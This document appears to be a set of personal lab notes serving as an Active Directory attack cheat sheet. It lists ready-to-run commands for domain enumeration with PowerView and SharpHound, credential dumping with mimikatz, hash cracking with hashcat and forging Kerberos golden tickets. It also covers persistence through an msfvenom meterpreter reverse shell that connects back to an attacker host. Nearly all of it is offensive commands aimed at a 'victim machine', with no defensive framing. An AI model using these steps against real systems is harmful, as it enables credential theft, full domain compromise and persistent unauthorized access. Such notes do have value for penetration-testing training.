

#Enumeration With Powerview
Powerview is a powerful powershell script from powershell empire that can be used for enumerating a domain after you have already gained a shell in the system.

1. "powershell -ep bypass -ep" bypasses the execution policy of powershell allowing you to easily run scripts

2. Upload PowerView.ps1 script to the victim machine, and run it (use scp)

3. Enumerate the domain users: Get-NetUser | select cn

4. Enumerate the domain groups: Get-NetGroup -GroupName *admin*

5. Enumerate shared folder: Invoke-ShareFinder

6. Enumerate OS: Get-NetComputer -fulldata | select operatingsystem

#Enumeration With Bloodhound

1. Intall bloodhound | neo4j console

2. "powershell -ep bypass" same as with PowerView

3. Upload SharpHound.ps1 to the victim machine and run it

4. Find "loot file" : Invoke-Bloodhound -CollectionMethod All -Domain CONTROLLER.local -ZipFileName <NameOfLootFile>.zip

5. Transfert loot file to my machine

6. Run "bloodhound" and log in with your credentials

7. Uploads the "loot file"

8. To view the graphed network open the menu and select queries this will give you a list of pre-compiled queries to choose from.

#Dumping Hashes w/ mimikats

1. upload mimikats.exe into the victim machine

2. run mimikatz.exe

3. run "privilege::debug"  to ensure that the output is "Privilege '20' ok" - This ensures that you're running mimikatz as an administrator; if you don't run mimikatz as an administrator, mimikatz will not run properly

4. lsadump::lsa /patch Dump those hashes!

5. Import hashes into a hash.txt file

6. Crack those hashes w/ hashcat hashcat -m 1000 <hash> rockyou.txt 

#Golden Ticket Attacks with mimikatz

1. Repeat step 1 to 3 of the previous session

3. lsadump::lsa /inject /name:krbtgt This dumps the hash and security identifier of the Kerberos Ticket Granting Ticket account allowing you to create a golden ticket

4. Note the User nme and Id, Domain Controller name and Id but also the Primary NTLM

5. Create a golden ticket: kerberos::golden /user:$ /domain:$ /sid:$ /krbtgt:$ /id:$

 -  Use the Golden Ticket to access other machine - 

6. "misc::cmd" - This will open a new command prompt with elevated privileges to all machines

#Enumeration w/server manager

1. Get access to victim computer ( Server Manager)
2. Navigate to the tools tab and select the Active Directory Users and Computers and investigate 

#Maintaining Access

1. Generate a payloads w/ msfvenom : msfvenom -p windows/meterpreter/reverse_tcp LHOST=$ LPORT=$ -f exe -o shell.exe  - this will generate a basic windows meterpreter reverse tcp shell

2. Transfert payloafs to the target machine (use scp)

3. Open msfconsole

4. "use exploit/multi/handler" - this will create a listener on the port that you set it on

5. Configure our payload to be a windows meterpreter shell: set payload windows/meterpreter/reverse_tcp

6. RUN

7. Background session (CTRL+Z)

8. Run the Persistence Module: "use exploit/windows/local/persistence" this module will send a payload every 10 seconds in default however you can set this time to anything you want

9. set session 1

10. Run 

